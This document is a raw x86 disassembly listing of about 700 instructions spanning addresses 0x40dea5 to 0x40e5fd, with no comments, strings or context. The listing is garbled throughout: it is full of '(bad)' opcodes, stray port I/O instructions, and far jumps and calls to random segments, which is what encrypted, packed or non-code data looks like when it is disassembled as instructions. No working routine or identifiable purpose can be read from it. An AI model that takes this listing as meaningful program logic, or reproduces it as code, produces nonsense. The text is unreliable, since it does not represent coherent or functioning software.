  40dea5:	repnz inc edi
  40dea7:	add    al,0xc6
  40dea9:	in     al,0xf9
  40deab:	jmp    0x53f:0x6ad9cc14
  40deb2:	(bad)
  40deb6:	or     al,0x1
  40deb8:	aaa    
  40deb9:	jo     0x40df0b
  40debb:	jnp    0x40df29
  40debd:	adc    al,BYTE PTR [ebx+0x8dd1715]
  40dec3:	jbe    0x40de89
  40dec5:	mov    dl,BYTE PTR [ebx+0x7a]
  40dec8:	push   ss
  40dec9:	mul    DWORD PTR [ebx]
  40decb:	pop    es
  40decc:	aam    0x51
  40dece:	dec    esp
  40decf:	adc    al,0x60
  40ded1:	sub    bl,BYTE PTR [ebp-0x6d]
  40ded4:	pop    esp
  40ded5:	and    al,0x49
  40ded7:	mov    ah,0x16
  40ded9:	mov    bl,0x8c
  40dedb:	fst    st(1)
  40dedd:	mov    al,0xa2
  40dedf:	stos   BYTE PTR es:[edi],al
  40dee0:	(bad)  
  40dee2:	mov    WORD PTR [edi],?
  40dee4:	cmp    eax,0x9a4e9bf9
  40dee9:	retf   0xe0df
  40deec:	scas   al,BYTE PTR es:[edi]
  40deed:	pop    ds
  40deee:	mov    WORD PTR [esi+0x2f],fs
  40def1:	shl    eax,1
  40def3:	pusha  
  40def4:	rcl    bl,0xe3
  40def7:	aaa    
  40def8:	repz lahf 
  40defa:	sti    
  40defb:	outs   dx,DWORD PTR ds:[esi]
  40defc:	out    dx,al
  40defd:	xchg   ebp,eax
  40defe:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df00:	mov    edi,0x928e4fda
  40df05:	lods   al,BYTE PTR ds:[esi]
  40df06:	push   0xffffff8b
  40df08:	scas   eax,DWORD PTR es:[edi]
  40df09:	inc    edx
  40df0a:	or     DWORD PTR [esi+edx*2-0x22705b57],edx
  40df11:	mov    BYTE PTR [esi],bl
  40df13:	mov    DWORD PTR [edx+ebp*8-0x5a0e5f65],0x31a0d6a
  40df1e:	js     0x40df46
  40df20:	out    dx,eax
  40df21:	cmp    BYTE PTR [esi-0x22],dh
  40df24:	push   ecx
  40df25:	arpl   cx,bx
  40df27:	cmp    DWORD PTR [edx+0x49],esi
  40df2a:	bound  ecx,QWORD PTR ds:0x5e2be830
  40df30:	(bad)  
  40df31:	mov    esi,0x20615933
  40df36:	pop    edx
  40df37:	or     eax,0xb846028f
  40df3c:	mov    bh,0x6b
  40df3e:	(bad)  
  40df3f:	mov    al,ds:0xa4b3d809
  40df44:	fild   QWORD PTR [esi-0x72528ac2]
  40df4a:	(bad)  
  40df4b:	inc    ebx
  40df4c:	pop    eax
  40df4d:	cmp    al,0xdb
  40df4f:	stc    
  40df50:	aam    0xbb
  40df52:	inc    edx
  40df53:	push   ss
  40df54:	in     al,0xcd
  40df56:	dec    esp
  40df57:	jnp    0x40df5a
  40df59:	cld    
  40df5a:	push   esp
  40df5b:	aad    0x8f
  40df5d:	sbb    al,0x9d
  40df5f:	mov    ds:0xb7b6d714,eax
  40df64:	pop    edx
  40df65:	jnp    0x40dfa2
  40df67:	out    dx,al
  40df68:	jns    0x40df85
  40df6a:	data16 mov cl,0x80
  40df6d:	sbb    eax,0xf5d35503
  40df72:	stos   DWORD PTR es:[edi],eax
  40df73:	sbb    eax,0x13ef121d
  40df78:	mov    BYTE PTR [ebp-0xd],bh
  40df7b:	ror    BYTE PTR [esi],cl
  40df7d:	pop    esp
  40df7e:	pop    es
  40df7f:	imul   edi,DWORD PTR [ecx],0x9
  40df82:	xor    esp,DWORD PTR [ecx]
  40df84:	bnd jp 0x40dfa5
  40df87:	dec    eax
  40df88:	stc    
  40df89:	nop
  40df8a:	cdq    
  40df8b:	in     al,dx
  40df8c:	pop    esi
  40df8d:	pop    esi
  40df8e:	push   cs
  40df8f:	and    al,0x8f
  40df91:	and    bl,dh
  40df93:	xlat   BYTE PTR ds:[ebx]
  40df94:	stc    
  40df95:	pop    es
  40df96:	cwde   
  40df97:	jo     0x40dfb0
  40df99:	mov    bl,0x91
  40df9b:	in     eax,0xeb
  40df9d:	lock push ecx
  40df9f:	ds sahf 
  40dfa1:	adc    al,0x4a
  40dfa3:	sbb    eax,0xdc62a87b
  40dfa8:	imul   esi,DWORD PTR [ebp+0x38],0xb529f0a6
  40dfaf:	nop
  40dfb0:	adc    eax,0xa1b47fe
  40dfb5:	xchg   ebx,eax
  40dfb6:	add    eax,0xc65fd425
  40dfbb:	push   ss
  40dfbc:	in     al,dx
  40dfbd:	cmp    dl,ch
  40dfbf:	lods   eax,DWORD PTR ds:[esi]
  40dfc0:	pop    ebx
  40dfc1:	lods   al,BYTE PTR ds:[esi]
  40dfc3:	test   eax,0x851adb2
  40dfc8:	sub    DWORD PTR [ebp-0x7944f4c5],ebx
  40dfce:	jbe    0x40dfb9
  40dfd0:	add    eax,0x4c42ba1
  40dfd5:	mov    bh,0xaa
  40dfd7:	sub    al,0xb7
  40dfd9:	pop    ebx
  40dfda:	jg     0x40dfbe
  40dfdc:	fdivr  DWORD PTR [edi-0x7be917b7]
  40dfe2:	sub    DWORD PTR [eax+0x43733d0],ebp
  40dfe8:	lss    ebp,FWORD PTR [ecx-0x75]
  40dfec:	sub    eax,0xba507bd7
  40dff1:	mov    dh,0x61
  40dff3:	aad    0x4d
  40dff5:	or     eax,0xd02d5b76
  40dffa:	lds    ecx,FWORD PTR [ecx]
  40dffc:	cdq    
  40dffd:	cs mov edi,0xbef351b1
  40e003:	add    al,0x2a
  40e005:	mov    eax,0xd7d71505
  40e00a:	push   edi
  40e00b:	enter  0xe0db,0x8c
  40e00f:	je     0x40e044
  40e011:	mov    al,0x64
  40e013:	hlt    
  40e014:	xchg   ebp,eax
  40e015:	cmp    eax,0xffa03c7a
  40e01a:	imul   edi,DWORD PTR [esi-0x60],0xffffff8d
  40e01e:	xor    al,0x39
  40e020:	sub    DWORD PTR [ebx-0x2299a967],ebp
  40e026:	mov    BYTE PTR [edx+0x648e4e72],0x46
  40e02d:	in     eax,0xa3
  40e02f:	ja     0x40e009
  40e031:	jbe    0x40e03b
  40e033:	adc    eax,0xdc7129f8
  40e038:	dec    esp
  40e039:	push   es
  40e03a:	cs (bad) 
  40e03c:	aam    0xa4
  40e03e:	xlat   BYTE PTR ds:[ebx]
  40e03f:	mov    ch,0x5d
  40e041:	sbb    al,0xa8
  40e043:	adc    al,0x35
  40e045:	ffreep st(6)
  40e047:	cdq    
  40e048:	repnz ds clc 
  40e04b:	dec    eax
  40e04c:	div    DWORD PTR [ebp+0xf]
  40e04f:	adc    BYTE PTR [ebx-0x5b22e9ab],dh
  40e055:	or     esp,eax
  40e057:	push   ecx
  40e058:	inc    ecx
  40e059:	mov    cl,0x4b
  40e05b:	inc    edi
  40e05c:	ret    0x5734
  40e05f:	and    ah,BYTE PTR [ecx-0x10c606b8]
  40e065:	dec    ebp
  40e066:	mov    fs,eax
  40e068:	lahf   
  40e069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e06a:	mov    ecx,0x1a95b1d7
  40e06f:	or     eax,0x5cf55a16
  40e074:	push   0xe984a9d5
  40e079:	mov    edx,0x6cfdc421
  40e07e:	fld    QWORD PTR [eax+0x74]
  40e081:	add    cl,BYTE PTR [eax]
  40e083:	imul   BYTE PTR [esi]
  40e085:	sub    al,bh
  40e087:	imul   eax,DWORD PTR [eax],0x7e
  40e08a:	fst    QWORD PTR [ebx+0x493d0a1f]
  40e090:	or     eax,0x4c7610e5
  40e095:	sub    ebp,DWORD PTR [edx-0x62]
  40e098:	popa   
  40e099:	outs   dx,BYTE PTR ds:[esi]
  40e09a:	pop    ebx
  40e09b:	test   BYTE PTR [ecx],dl
  40e09d:	ins    DWORD PTR es:[edi],dx
  40e09e:	or     ecx,esi
  40e0a0:	inc    esi
  40e0a1:	dec    BYTE PTR [ebp-0x71]
  40e0a4:	fmul   QWORD PTR [eax]
  40e0a6:	aam    0x80
  40e0a8:	ret    
  40e0a9:	sbb    eax,DWORD PTR [edi+0x6aff6ee3]
  40e0af:	cmc    
  40e0b0:	aad    0x72
  40e0b2:	stc    
  40e0b3:	push   esi
  40e0b4:	dec    esp
  40e0b5:	setb   BYTE PTR [edx+0x16e9578a]
  40e0bc:	mov    ebx,0x18402391
  40e0c1:	std    
  40e0c2:	sahf   
  40e0c3:	daa    
  40e0c4:	jle    0x40e0b5
  40e0c6:	icebp  
  40e0c7:	pushf  
  40e0c8:	mov    al,bh
  40e0ca:	add    eax,0xe971176d
  40e0cf:	push   es
  40e0d0:	daa    
  40e0d1:	or     ecx,DWORD PTR [esi-0x1a]
  40e0d4:	xor    BYTE PTR [edx-0x17],dl
  40e0d7:	retf   0xa834
  40e0da:	pop    es
  40e0db:	cmc    
  40e0dc:	daa    
  40e0dd:	fdiv   st,st(0)
  40e0df:	sub    eax,0x4c7c5ba
  40e0e4:	test   ah,ah
  40e0e6:	cli    
  40e0e7:	and    ah,BYTE PTR [eax]
  40e0e9:	fisubr WORD PTR [eax-0x80]
  40e0ec:	in     eax,dx
  40e0ed:	sbb    BYTE PTR [ebx+0x3b],al
  40e0f0:	jmp    esi
  40e0f2:	lods   al,BYTE PTR ds:[esi]
  40e0f3:	aad    0xe7
  40e0f5:	inc    esp
  40e0f6:	shl    DWORD PTR [eax+0x1a],0x74
  40e0fa:	jnp    0x40e104
  40e0fc:	mov    eax,ds:0x97a90a9a
  40e101:	xor    eax,0x4b7fd700
  40e106:	fucomi st,st(2)
  40e108:	aad    0xbb
  40e10a:	cmp    al,0xdc
  40e10c:	add    eax,0xc4bb04d3
  40e111:	inc    edx
  40e112:	mov    edi,0x2ae13135
  40e117:	push   ss
  40e118:	cdq    
  40e119:	stos   BYTE PTR es:[edi],al
  40e11a:	ss icebp 
  40e11c:	jle    0x40e140
  40e11e:	(bad)  
  40e11f:	mov    esi,0xb7b84a20
  40e124:	adc    BYTE PTR [ebx+0x8],dl
  40e127:	fldenv [ebp-0x6f588e92]
  40e12d:	rol    DWORD PTR [ecx-0x1a0f8749],0xd5
  40e134:	fdiv   st,st(3)
  40e136:	mov    edi,0x614cb63f
  40e13b:	ins    DWORD PTR es:[edi],dx
  40e13c:	lock jle 0x40e1a0
  40e13f:	cmp    BYTE PTR [ebx-0x42],dh
  40e142:	xchg   BYTE PTR [esi-0x335de3c5],cl
  40e148:	rcr    bh,1
  40e14a:	cwde   
  40e14b:	test   DWORD PTR [esi-0x24],0x106f23c9
  40e152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e153:	(bad)  
  40e154:	xchg   ebp,eax
  40e155:	push   ebx
  40e156:	sbb    eax,0x6597def1
  40e15b:	xor    cl,BYTE PTR [ebx+0x6e]
  40e15e:	retf   
  40e15f:	inc    esp
  40e160:	dec    esp
  40e161:	retf   
  40e162:	push   ebp
  40e163:	xchg   edi,eax
  40e164:	inc    ecx
  40e165:	(bad)  
  40e166:	out    dx,eax
  40e167:	jbe    0x40e17d
  40e169:	ds add al,0x1c
  40e16c:	call   0x8366:0x6298bf2b
  40e173:	cmp    al,0x10
  40e175:	lock nop
  40e177:	test   eax,0xdc52b137
  40e17c:	mov    DWORD PTR [eax+ecx*2-0x3f],edi
  40e180:	mov    bh,0x2a
  40e182:	mov    ecx,0xd9bbd252
  40e187:	(bad)  
  40e188:	inc    esp
  40e189:	pop    ss
  40e18a:	out    0x52,eax
  40e18c:	popf   
  40e18d:	les    ecx,FWORD PTR ds:0xac51e14c
  40e193:	shl    edx,1
  40e195:	test   al,0x3a
  40e197:	loopne 0x40e1a2
  40e199:	mov    ds:0x70ef295a,al
  40e19e:	push   edi
  40e19f:	dec    ebx
  40e1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a1:	dec    ebp
  40e1a2:	call   0xd5cf:0xb84cfbbf
  40e1a9:	dec    ebp
  40e1aa:	fadd   DWORD PTR [ecx-0x5ceae726]
  40e1b0:	fwait
  40e1b1:	sbb    eax,0x2c6262f1
  40e1b6:	dec    ecx
  40e1b7:	jg     0x80785d3f
  40e1bd:	or     eax,0xbed09275
  40e1c2:	rcl    BYTE PTR [esi+0x12d17ae8],0x99
  40e1c9:	rcl    BYTE PTR [ecx-0x7c],cl
  40e1cc:	sub    BYTE PTR [ecx-0x3],cl
  40e1cf:	inc    edi
  40e1d0:	pusha  
  40e1d1:	jns    0x40e226
  40e1d3:	and    al,BYTE PTR [ebx]
  40e1d5:	jb     0x40e1c8
  40e1d7:	xor    BYTE PTR [ebx+0x5],bl
  40e1da:	sbb    eax,0x3960707b
  40e1df:	iret   
  40e1e0:	dec    DWORD PTR [esi-0x22e12117]
  40e1e6:	cmp    DWORD PTR [eax],eax
  40e1e8:	mov    ds,WORD PTR [esi-0x1235a67a]
  40e1ee:	and    bl,al
  40e1f0:	and    BYTE PTR [ebx],cl
  40e1f2:	jae    0x40e26b
  40e1f4:	fs dec ecx
  40e1f6:	test   DWORD PTR [ecx+ebp*4-0x1b],0xa10a0d83
  40e1fe:	push   eax
  40e1ff:	pop    ecx
  40e200:	ja     0x40e245
  40e202:	xor    DWORD PTR [esp+ebp*4-0x5],0xfffffff6
  40e207:	adc    DWORD PTR [ebp-0x613aeeb],0x2301c4ad
  40e211:	inc    esi
  40e212:	adc    dh,BYTE PTR [ebx+0x72d912f5]
  40e218:	xor    eax,0xe9b2d47
  40e21d:	pusha  
  40e21e:	popf   
  40e21f:	or     dh,bh
  40e221:	or     eax,esp
  40e223:	jne    0x40e2a4
  40e225:	pop    edx
  40e226:	repz xor al,0x50
  40e229:	div    edx
  40e22b:	inc    esp
  40e22c:	sbb    cl,BYTE PTR [eax+esi*2-0x59e548f5]
  40e233:	sub    eax,0x4d23657b
  40e238:	adc    al,BYTE PTR [ecx]
  40e23a:	aaa    
  40e23b:	adc    al,0x7a
  40e23d:	adc    BYTE PTR [edi],0xbc
  40e240:	adc    dh,bl
  40e242:	clc    
  40e243:	cwde   
  40e244:	push   0xcf9e2327
  40e249:	sbb    BYTE PTR [ecx],ch
  40e24b:	ja     0x40e2ae
  40e24d:	sub    edx,eax
  40e24f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e250:	fs add al,0x3f
  40e253:	add    al,ah
  40e255:	sar    BYTE PTR [ecx+0xe],cl
  40e258:	scas   eax,DWORD PTR es:[edi]
  40e259:	inc    ecx
  40e25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e25b:	jmp    0x6138d895
  40e260:	or     DWORD PTR [ebx-0x39],edx
  40e263:	shl    DWORD PTR [esp+edx*2+0x3f],1
  40e267:	sub    DWORD PTR [ebx+0x211dda12],esi
  40e26d:	aaa    
  40e26e:	stos   BYTE PTR es:[edi],al
  40e26f:	cmp    BYTE PTR [edx],bl
  40e271:	push   ebp
  40e272:	add    BYTE PTR [esi],ch
  40e274:	and    bh,BYTE PTR [ebp+eax*4-0x13]
  40e278:	and    eax,0xe55fa65d
  40e27d:	mov    ds:0x62f2b157,al
  40e282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e283:	jnp    0x40e276
  40e285:	jnp    0x40e2f4
  40e287:	adc    BYTE PTR [ecx-0x5bc07ae5],cl
  40e28d:	pop    ds
  40e28e:	out    0xcf,al
  40e290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e291:	inc    eax
  40e292:	lock mov ecx,0xb98f0789
  40e298:	outs   dx,DWORD PTR ds:[esi]
  40e299:	gs stc 
  40e29b:	jmp    0x40e278
  40e29d:	sbb    al,0xf3
  40e29f:	fiadd  WORD PTR [edx]
  40e2a1:	fwait
  40e2a2:	inc    esi
  40e2a3:	mov    ebp,0x77c14480
  40e2a8:	(bad)  
  40e2a9:	xchg   edi,eax
  40e2aa:	sbb    esi,0x9ca2d70e
  40e2b0:	or     al,0xd0
  40e2b2:	lea    edi,[edx-0x64]
  40e2b5:	mov    esp,0xfed011f4
  40e2ba:	fs add al,0x6f
  40e2bd:	dec    ebp
  40e2be:	fstp   QWORD PTR [edi+0x20995492]
  40e2c4:	js     0x40e2c9
  40e2c6:	lods   al,BYTE PTR ds:[esi]
  40e2c7:	stc    
  40e2c8:	enter  0xd879,0x88
  40e2cc:	sub    al,0x27
  40e2ce:	inc    edi
  40e2cf:	aaa    
  40e2d0:	fiadd  WORD PTR [edi]
  40e2d2:	dec    esi
  40e2d3:	dec    edi
  40e2d4:	push   edi
  40e2d5:	(bad)
  40e2d8:	pop    edi
  40e2d9:	(bad)  
  40e2db:	cmc    
  40e2dc:	xchg   esp,eax
  40e2dd:	pop    edi
  40e2de:	push   ss
  40e2df:	(bad)  
  40e2e0:	xchg   esi,eax
  40e2e1:	outs   dx,BYTE PTR ds:[esi]
  40e2e2:	adc    eax,0xae02d2ca
  40e2e7:	push   edx
  40e2e8:	and    eax,0x5061019
  40e2ed:	fimul  WORD PTR [edi]
  40e2ef:	fwait
  40e2f0:	and    DWORD PTR [eax-0x5b157bce],esp
  40e2f6:	jne    0x40e376
  40e2f8:	dec    esi
  40e2f9:	cmp    BYTE PTR [ebp-0x17],dh
  40e2fc:	mov    esi,ebp
  40e2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e300:	outs   dx,DWORD PTR ds:[esi]
  40e301:	pop    esi
  40e302:	arpl   WORD PTR [ecx+0x66],bp
  40e305:	inc    edx
  40e306:	pop    ebx
  40e307:	inc    edx
  40e308:	test   al,0xad
  40e30a:	push   edi
  40e30b:	cmp    al,0xc0
  40e30d:	mov    ebx,0x9a89c090
  40e312:	push   es
  40e313:	lods   eax,DWORD PTR ds:[esi]
  40e314:	pusha  
  40e315:	inc    ebp
  40e316:	pusha  
  40e317:	jbe    0x40e2fa
  40e319:	aas    
  40e31a:	inc    edx
  40e31b:	adc    al,0xd7
  40e31d:	push   ebx
  40e31e:	and    DWORD PTR [esi],esi
  40e320:	sbb    bl,BYTE PTR [ebx-0x6ee06d8d]
  40e326:	std    
  40e327:	fcomp  QWORD PTR [eax]
  40e329:	cmp    BYTE PTR [edx-0x74],0xe9
  40e32d:	xor    al,0xc7
  40e32f:	sub    dl,BYTE PTR [esi]
  40e331:	std    
  40e332:	xchg   esi,eax
  40e333:	sub    esp,eax
  40e335:	dec    ebx
  40e336:	aaa    
  40e337:	mov    bl,0xce
  40e339:	test   eax,edi
  40e33b:	and    ah,ah
  40e33d:	popf   
  40e33e:	xor    dh,bh
  40e340:	(bad)  
  40e341:	pop    ebx
  40e342:	jbe    0x40e302
  40e344:	(bad)  
  40e345:	or     eax,0xaa6158d5
  40e34a:	mov    cl,0x1
  40e34c:	jp     0x40e301
  40e34e:	xor    ebx,DWORD PTR [edi-0x1]
  40e351:	cs (bad) 
  40e353:	mov    eax,ds:0x92fa12e3
  40e358:	and    DWORD PTR [edx+0x550a940d],esi
  40e35e:	pop    esi
  40e35f:	lds    edx,FWORD PTR [esi]
  40e361:	mov    bl,0xdc
  40e363:	jle    0x40e318
  40e365:	test   bl,bh
  40e367:	push   eax
  40e368:	into   
  40e369:	xchg   esp,eax
  40e36a:	fistp  WORD PTR [edx+ebp*8+0x5bd5131]
  40e371:	adc    eax,ebp
  40e373:	jle    0x40e3aa
  40e375:	fimul  DWORD PTR [edi+ecx*8-0x39]
  40e379:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40e37b:	test   DWORD PTR [edx-0x7d],eax
  40e37e:	mov    al,0x5
  40e380:	pop    ebx
  40e381:	push   DWORD PTR [ebp-0x13c8c766]
  40e387:	cmp    ebp,ebx
  40e389:	jmp    0x40e31c
  40e38b:	int3   
  40e38c:	push   edi
  40e38d:	sbb    edi,DWORD PTR [ebx+edi*8+0x3970be46]
  40e394:	inc    eax
  40e395:	fcmovb st,st(4)
  40e397:	and    eax,0x1d34d795
  40e39c:	adc    bh,cl
  40e39e:	and    ebp,DWORD PTR [edi-0x59f6a9f]
  40e3a4:	push   edi
  40e3a5:	fild   WORD PTR [esi]
  40e3a7:	nop
  40e3a8:	sbb    DWORD PTR [ecx],ebx
  40e3aa:	shr    DWORD PTR [ecx],cl
  40e3ac:	mov    bh,0xdf
  40e3ae:	repnz sti 
  40e3b0:	int    0xad
  40e3b2:	push   cs
  40e3b3:	stos   DWORD PTR es:[edi],eax
  40e3b4:	or     ecx,DWORD PTR [edi]
  40e3b6:	sbb    BYTE PTR [edx+0x2],ah
  40e3b9:	xor    ch,BYTE PTR [edi-0x32]
  40e3bc:	push   esp
  40e3bd:	scas   eax,DWORD PTR es:[edi]
  40e3be:	ss dec edi
  40e3c0:	mov    ebx,0xca0ec792
  40e3c5:	mov    cl,0xd2
  40e3c7:	in     al,dx
  40e3c8:	ss nop
  40e3ca:	mov    ds,WORD PTR [ecx+0x42]
  40e3cd:	ins    BYTE PTR es:[edi],dx
  40e3ce:	and    ebx,DWORD PTR [edx+0xb]
  40e3d1:	stc    
  40e3d2:	aam    0x6d
  40e3d4:	push   ebp
  40e3d5:	repnz stos DWORD PTR es:[edi],eax
  40e3d7:	mov    dh,0x79
  40e3d9:	mov    bl,0xc7
  40e3db:	sar    DWORD PTR [edx],1
  40e3dd:	or     DWORD PTR [edx-0x4d],eax
  40e3e0:	xchg   edx,eax
  40e3e1:	push   ecx
  40e3e2:	and    DWORD PTR [edi-0x4d028411],ebp
  40e3e8:	pusha  
  40e3e9:	adc    DWORD PTR [eax-0x80],esp
  40e3ec:	add    BYTE PTR [ecx],0x59
  40e3ef:	popa   
  40e3f0:	je     0x40e45a
  40e3f2:	outs   dx,BYTE PTR ds:[esi]
  40e3f3:	cmp    BYTE PTR [ebx-0x6111ba9],ah
  40e3f9:	lods   al,BYTE PTR ds:[esi]
  40e3fa:	push   es
  40e3fb:	push   es
  40e3fc:	dec    esi
  40e3fd:	mov    ch,0x22
  40e3ff:	dec    edi
  40e400:	shr    DWORD PTR [eax+eiz*4+0x38],1
  40e404:	pop    eax
  40e405:	leave  
  40e406:	mov    bh,0xa
  40e408:	and    DWORD PTR [ebx-0x2543066b],0xffffff82
  40e40f:	mov    BYTE PTR [ecx],ch
  40e411:	jg     0x40e476
  40e413:	jno    0x40e40c
  40e415:	sbb    eax,0xda2c0450
  40e41a:	jmp    0x53b8:0xf3caa53
  40e421:	not    DWORD PTR [esi+ecx*4]
  40e424:	ins    DWORD PTR es:[edi],dx
  40e425:	into   
  40e426:	int    0xcd
  40e428:	jnp    0x40e465
  40e42a:	inc    edx
  40e42b:	add    ebx,DWORD PTR [edi-0x75]
  40e42e:	jno    0x40e4a9
  40e430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e432:	push   eax
  40e433:	mov    ch,0x1a
  40e435:	inc    esi
  40e436:	xor    DWORD PTR [esi-0x7e],ebx
  40e439:	loopne 0x40e3f1
  40e43b:	pop    esi
  40e43c:	xor    esi,DWORD PTR [ebp-0x6c052b0b]
  40e442:	sub    al,0xfe
  40e444:	stos   DWORD PTR es:[edi],eax
  40e445:	pushf  
  40e446:	arpl   WORD PTR [ebx+0x61578d52],si
  40e44c:	adc    dl,BYTE PTR [eax+0x1bc18b00]
  40e452:	mov    eax,0x1b13031b
  40e457:	dec    esi
  40e458:	add    BYTE PTR [edx-0x4a],cl
  40e45b:	hlt    
  40e45c:	inc    ebx
  40e45d:	mov    ecx,0x84b5fadd
  40e462:	push   edx
  40e463:	adc    al,0x15
  40e465:	(bad)  
  40e467:	cmp    edi,ebx
  40e469:	ffreep st(1)
  40e46b:	push   edi
  40e46c:	adc    esp,DWORD PTR [ebx+0x48]
  40e46f:	sbb    al,0x78
  40e471:	aas    
  40e472:	pop    ebp
  40e473:	or     eax,0x6603914c
  40e478:	call   0x8cd4ac60
  40e47d:	mov    ah,0xc4
  40e47f:	mov    edx,eax
  40e481:	call   0xc972:0x86bdf8f1
  40e488:	imul   ecx,DWORD PTR [eax-0xe98a581],0xffffffaa
  40e48f:	repz mov dl,0x9d
  40e492:	cmc    
  40e493:	push   0x148abbc7
  40e498:	jne    0x40e476
  40e49a:	jne    0x40e4a4
  40e49c:	scas   al,BYTE PTR es:[edi]
  40e49d:	mov    WORD PTR [ecx-0xb1acbb9],ds
  40e4a3:	cwde   
  40e4a4:	ficom  DWORD PTR [edi-0x6d]
  40e4a7:	push   esi
  40e4a8:	mov    edi,0x46764877
  40e4ad:	jns    0x40e473
  40e4af:	dec    ecx
  40e4b0:	ss in  eax,0x9f
  40e4b3:	shl    BYTE PTR [eax],0x26
  40e4b6:	arpl   si,sp
  40e4b8:	or     DWORD PTR [edx],edi
  40e4ba:	pushf  
  40e4bb:	retf   0xcac9
  40e4be:	jns    0x40e4e5
  40e4c0:	fdivrp st(0),st
  40e4c2:	dec    BYTE PTR [edi-0x381d96fc]
  40e4c8:	(bad)  
  40e4c9:	pop    ss
  40e4ca:	dec    DWORD PTR [eax]
  40e4cc:	mov    ?,WORD PTR [ecx]
  40e4ce:	clc    
  40e4cf:	add    bh,BYTE PTR ds:0x234e3ad0
  40e4d5:	lods   eax,DWORD PTR ds:[esi]
  40e4d6:	jle    0x40e4fe
  40e4d8:	add    al,0xd6
  40e4da:	xor    al,0xf3
  40e4dc:	or     al,cl
  40e4de:	(bad)  
  40e4e0:	frstor ds:0x92c68f2
  40e4e6:	xchg   DWORD PTR [edi-0x41d82113],eax
  40e4ec:	adc    ch,dh
  40e4ee:	sub    dl,ch
  40e4f0:	gs out dx,eax
  40e4f2:	lock fdiv QWORD PTR [eax]
  40e4f5:	and    bh,bh
  40e4f7:	ins    BYTE PTR es:[edi],dx
  40e4f8:	lods   eax,DWORD PTR ds:[esi]
  40e4f9:	std    
  40e4fa:	mov    al,0xa
  40e4fc:	inc    ebp
  40e4fd:	jmp    0xa8d6b31d
  40e502:	sbb    cl,BYTE PTR [ebx-0x6d]
  40e505:	out    0x9e,eax
  40e507:	pop    ds
  40e508:	cs mov eax,0x9bc8aac9
  40e50e:	int3   
  40e50f:	sub    DWORD PTR [edx],eax
  40e511:	push   ds
  40e512:	ja     0x40e4a4
  40e514:	cmp    bh,BYTE PTR [ebp-0x14]
  40e517:	call   0x758a:0x25531837
  40e51e:	fnsave [ebp-0xa]
  40e521:	dec    edi
  40e522:	fisub  DWORD PTR [ecx-0x5d]
  40e525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e526:	pop    es
  40e527:	cdq    
  40e528:	push   esp
  40e529:	or     eax,0x75365e0d
  40e52e:	pop    ebx
  40e52f:	aas    
  40e530:	adc    DWORD PTR [esi+edi*1+0x58],0xef06eb5
  40e538:	aas    
  40e539:	pushf  
  40e53a:	push   ebp
  40e53b:	fisubr DWORD PTR [ebx+0x7d501865]
  40e541:	(bad)  
  40e542:	imul   ebx,esi,0xffffffbc
  40e545:	ffree  st(2)
  40e547:	test   al,0x21
  40e549:	out    0x7c,al
  40e54b:	int3   
  40e54c:	loopne 0x40e529
  40e54e:	push   DWORD PTR [ecx]
  40e550:	daa    
  40e551:	and    al,0x13
  40e553:	jno    0x40e4ff
  40e555:	pop    ss
  40e556:	add    eax,0xd5841f47
  40e55b:	adc    ebx,DWORD PTR [ecx]
  40e55d:	aam    0xde
  40e55f:	gs iret 
  40e561:	ficomp WORD PTR [eax]
  40e563:	sti    
  40e564:	push   ecx
  40e565:	(bad)  
  40e566:	jbe    0x40e5d7
  40e568:	xor    ebp,DWORD PTR [esi]
  40e56a:	or     BYTE PTR [edx],bl
  40e56c:	es push edx
  40e56e:	js     0x40e5a5
  40e570:	xor    BYTE PTR [edi-0x4f7ab777],dl
  40e576:	adc    eax,0xe7138d76
  40e57b:	(bad)  [ebx]
  40e57d:	dec    ebx
  40e57e:	sub    DWORD PTR [edi-0x29],0xa6292044
  40e585:	mov    ecx,DWORD PTR [ebx]
  40e587:	fistp  QWORD PTR [esi+edi*4+0x3031fe7c]
  40e58e:	aas    
  40e58f:	and    al,0x1b
  40e591:	push   edx
  40e592:	bound  ebx,QWORD PTR [edi-0x6c]
  40e595:	or     bl,BYTE PTR [edx]
  40e597:	inc    ecx
  40e598:	jb     0x40e5dc
  40e59a:	inc    ebx
  40e59b:	sbb    ebx,ebp
  40e59d:	cmp    al,0x7c
  40e59f:	inc    ebp
  40e5a0:	or     BYTE PTR [edx+0x4128d1cf],dh
  40e5a6:	lds    edx,FWORD PTR [edi]
  40e5a8:	fmul   QWORD PTR [ecx+esi*1+0x76]
  40e5ac:	(bad)
  40e5b0:	cdq    
  40e5b1:	shl    DWORD PTR [ecx+ebx*8-0x36],0xe6
  40e5b6:	imul   ecx,DWORD PTR [edi-0x531a9826],0x28
  40e5bd:	jecxz  0x40e62d
  40e5bf:	hlt    
  40e5c0:	mov    dh,0x2e
  40e5c2:	and    esi,DWORD PTR [eax+0x5c]
  40e5c5:	sbb    BYTE PTR [ebp+0x26],dl
  40e5c8:	push   ds
  40e5c9:	xlat   BYTE PTR ds:[ebx]
  40e5ca:	cli    
  40e5cb:	div    BYTE PTR [eax+0x52c3994b]
  40e5d1:	out    0xa8,eax
  40e5d3:	mov    dh,0x6e
  40e5d5:	mov    ebx,0xf7597014
  40e5da:	fwait
  40e5db:	test   BYTE PTR [eax-0x3c],al
  40e5de:	call   0x9220c572
  40e5e3:	push   ecx
  40e5e4:	adc    cl,BYTE PTR [ebx+0x57]
  40e5e7:	cs je  0x40e619
  40e5ea:	jnp    0x40e609
  40e5ec:	bound  edi,QWORD PTR [bx+di+0x9]
  40e5f0:	lods   al,BYTE PTR ds:[esi]
  40e5f1:	cmp    eax,0x8ed71b03
  40e5f6:	ins    BYTE PTR es:[edi],dx
  40e5f7:	mov    ah,0xc9
  40e5f9:	xor    BYTE PTR [ebp-0x10],dl
  40e5fc:	leave  
  40e5fd:	fsub   QWORD PTR [ebx+0x2c]
